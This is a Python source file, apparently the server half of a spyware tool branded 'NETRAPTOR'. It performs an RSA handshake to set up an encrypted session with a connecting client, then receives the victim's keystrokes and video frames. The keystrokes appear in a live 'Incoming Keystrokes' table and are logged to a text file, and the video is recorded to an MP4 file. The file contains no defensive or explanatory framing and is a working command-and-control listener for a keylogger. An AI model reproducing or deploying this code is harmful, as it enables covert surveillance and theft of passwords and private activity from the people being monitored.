#!/usr/bin/env python3
import socket
import argparse
import threading
import struct
import queue
import datetime
import os
import sys
import subprocess
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich import box
import cv2
import numpy as np

# Packet type bytes
TYPE_TEXT = b"\x01"
TYPE_VIDEO = b"\x02"

console = Console()

# === BANNERS ===
text_logo = """[bold bright_cyan]
███╗   ██╗███████╗████████╗██████╗  █████╗ ██████╗ ████████╗ ██████╗ ██████╗ 
████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██╔██╗ ██║█████╗     ██║   ██████╔╝███████║██████╔╝   ██║   ██║   ██║██████╔╝
██║╚██╗██║██╔══╝     ██║   ██╔══██╗██╔══██║██╔═══╝    ██║   ██║   ██║██╔══██╗
██║ ╚████║███████╗   ██║   ██║  ██║██║  ██║██║        ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝
[/bold bright_cyan]"""

logo_banner = """[bold deep_sky_blue1]
              ___----------___
         _--                ----__
        -                         ---_
       -___    ____---_              --_
   __---_ .-_--   _ O _-                -
  -      -_-       ---                   -
 -   __---------___                       -
 - _----                                  -
  -     -_                                 _
  `      _-                                 _
        _                           _-_  _-_ _
       _-                   ____    -_  -   --
       -   _-__   _    __---    -------       -
      _- _-   -_-- -_--                        _
      -_-                                       _
     _-                                          _
[/bold deep_sky_blue1]"""


# === Utilities ===
def recvall(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            raise ConnectionError("Socket closed while reading")
        data.extend(packet)
    return bytes(data)


def send_length_prefixed(conn, b: bytes):
    conn.sendall(struct.pack(">I", len(b)))
    conn.sendall(b)


def generate_rsa_keys():
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    pub_pem = pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return priv, pub_pem


# === Worker: Display Keystrokes in Live Table ===
def text_worker(
    text_q: "queue.Queue[str]",
    stop_event: threading.Event,
    log_file="received_messages.txt",
):
    os.makedirs(os.path.dirname(log_file) or ".", exist_ok=True)
    messages = []

    with Live(refresh_per_second=4, console=console, transient=True) as live:
        while not stop_event.is_set():
            updated = False
            try:
                while True:
                    text = text_q.get_nowait()
                    ts = datetime.datetime.now().strftime("%H:%M:%S")
                    messages.append((ts, text))
                    messages = messages[-10:]
                    line = f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {text}"
                    with open(log_file, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                    updated = True
            except queue.Empty:
                pass

            if updated:
                table = Table(
                    title="[bold magenta]Incoming Keystrokes[/bold magenta]",
                    box=box.ROUNDED,
                )
                table.add_column("Timestamp", style="bright_cyan", width=12)
                table.add_column("Keystrokes", style="bright_white")
                for tstamp, msg in messages:
                    table.add_row(tstamp, msg)
                live.update(table)

            threading.Event().wait(0.1)


# === Worker: Video Frames ===
def video_worker(
    video_q,
    stop_event,
    out_file="out.mp4",
    show_preview=True,
    frame_size=(640, 480),
    fps=20,
):
    ffmpeg_cmd = [
        "ffmpeg",
        "-y",
        "-loglevel",
        "quiet",
        "-f",
        "rawvideo",
        "-vcodec",
        "rawvideo",
        "-pix_fmt",
        "bgr24",
        "-s",
        f"{frame_size[0]}x{frame_size[1]}",
        "-r",
        str(fps),
        "-i",
        "-",
        out_file,
    ]
    process = subprocess.Popen(ffmpeg_cmd, stdin=subprocess.PIPE)

    try:
        while not stop_event.is_set():
            try:
                jpg = video_q.get(timeout=0.5)
            except queue.Empty:
                continue

            arr = np.frombuffer(jpg, dtype=np.uint8)
            frame = cv2.imdecode(arr, cv2.IMREAD_COLOR)
            if frame is None:
                continue
            if frame.shape[1] != frame_size[0] or frame.shape[0] != frame_size[1]:
                frame = cv2.resize(frame, frame_size)

            if process.stdin:
                process.stdin.write(frame.tobytes())

            if show_preview:
                cv2.imshow("Preview", frame)
                if cv2.waitKey(1) & 0xFF == ord("q"):
                    stop_event.set()
                    break
    finally:
        if process.stdin:
            process.stdin.close()
        process.wait()
        cv2.destroyAllWindows()


# === Receiver ===
def receiver_loop(conn, fernet, text_q, video_q, stop_event):
    try:
        while not stop_event.is_set():
            t = recvall(conn, 1)
            if not t:
                break
            size_bytes = recvall(conn, 4)
            size = struct.unpack(">I", size_bytes)[0]
            if size == 0:
                continue
            enc = recvall(conn, size)
            try:
                data = fernet.decrypt(enc)
            except Exception as e:
                console.print(f"[red][!] Decryption failed:[/red] {e}")
                continue

            if t == TYPE_TEXT:
                text_q.put(data.decode(errors="replace"))
            elif t == TYPE_VIDEO:
                video_q.put(data)
            else:
                console.print(f"[red][!] Unknown packet type:[/red] {t}")
    except ConnectionError as e:
        console.print(f"[yellow][*] Connection closed:[/yellow] {e}")
    finally:
        stop_event.set()
        try:
            conn.close()
        except Exception:
            pass


# === Handshake ===
def handle_client_connection(conn, rsa_priv, text_q, video_q):
    console.print(
        Panel.fit(
            f"[bold green]✅ New client connected:[/bold green] {conn.getpeername()}",
            title="[bold yellow]Connection Established[/bold yellow]",
            border_style="green",
        )
    )

    pub_pem = rsa_priv.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    send_length_prefixed(conn, pub_pem)

    size_bytes = recvall(conn, 4)
    size = struct.unpack(">I", size_bytes)[0]
    enc_key = recvall(conn, size)
    session_key = rsa_priv.decrypt(
        enc_key,
        padding.OAEP(
            mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None
        ),
    )
    fernet = Fernet(session_key)

    console.print(
        Panel.fit(
            "[bold green]🔐 RSA handshake complete. Fernet session established.[/bold green]",
            title="[bold blue]Encryption Ready[/bold blue]",
            border_style="blue",
        )
    )

    stop_event = threading.Event()
    recv_thread = threading.Thread(
        target=receiver_loop,
        args=(conn, fernet, text_q, video_q, stop_event),
        daemon=True,
    )
    recv_thread.start()
    return stop_event, recv_thread


def banner_printer():
    console.print(text_logo)
    console.print(logo_banner)
    console.rule("[bold bright_yellow]Secure Server Startup[/bold bright_yellow]")


# === MAIN ===
def main():
    parser = argparse.ArgumentParser(description="Encrypted server with Rich UI")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-p", "--port", type=int, required=True)
    parser.add_argument("--out", default="out.mp4", help="Output MP4 filename")
    parser.add_argument(
        "--no-preview", action="store_true", help="Disable video preview window"
    )
    args = parser.parse_args()

    banner_printer()

    rsa_priv, _ = generate_rsa_keys()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((args.target, args.port))
    server.listen(1)

    console.print(
        Panel.fit(
            f"💤 Waiting for client on [bold cyan]{args.target}:{args.port}[/bold cyan]",
            title="[bold yellow]Listening[/bold yellow]",
            border_style="cyan",
        )
    )

    text_q = queue.Queue()
    video_q = queue.Queue()

    try:
        conn, addr = server.accept()
        stop_event, recv_thread = handle_client_connection(
            conn, rsa_priv, text_q, video_q
        )

        text_thread = threading.Thread(
            target=text_worker, args=(text_q, stop_event), daemon=True
        )
        video_thread = threading.Thread(
            target=video_worker,
            args=(video_q, stop_event, args.out, not args.no_preview),
            daemon=True,
        )
        text_thread.start()
        video_thread.start()

        recv_thread.join()
    except KeyboardInterrupt:
        console.print("\n[yellow][*] Interrupted by user.[/yellow]")
    finally:
        try:
            server.close()
        except Exception:
            pass
        console.print(Panel.fit("🛑 Server shutting down...", border_style="red"))


if __name__ == "__main__":
    main()
